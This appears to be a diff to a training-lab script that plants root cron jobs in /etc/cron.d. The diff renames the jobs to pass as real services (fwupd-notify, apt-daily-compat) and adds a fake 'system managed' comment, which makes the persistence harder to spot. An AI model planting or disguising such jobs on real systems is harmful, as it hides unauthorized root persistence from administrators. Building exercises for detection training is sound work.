@@ -41,7 +41,7 @@ CRON_DIR="/etc/cron.d"
 
 
 # Job 1 — disguised as a grub/boot service helper
-JOB1_FILE="${CRON_DIR}/grub-service"
+JOB1_FILE="${CRON_DIR}/fwupd-notify"
 JOB1_SCHEDULE="*/5 * * * *"   # every 5 minutes
 JOB1_USER="root"
 
@@ -49,7 +49,7 @@ JOB1_USER="root"
 
 
 # Job 2 — less subtle, obviously evil name for trainees to spot
-JOB2_FILE="${CRON_DIR}/sillyevilcronjob"
+JOB2_FILE="${CRON_DIR}/apt-daily-compat"
 JOB2_SCHEDULE="*/3 * * * *"   # every 3 minutes
 JOB2_USER="root"
 
@@ -81,7 +81,7 @@ CMD="$(build_cmd)"
 # Write Job 1
 info "Writing cron job 1  →  ${JOB1_FILE}"
 cat > "${JOB1_FILE}" <<EOF
-# grub-env sync helper — do not remove (system managed)
+# fwupd firmware notification helper — do not remove (system managed)
 SHELL=/bin/bash
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
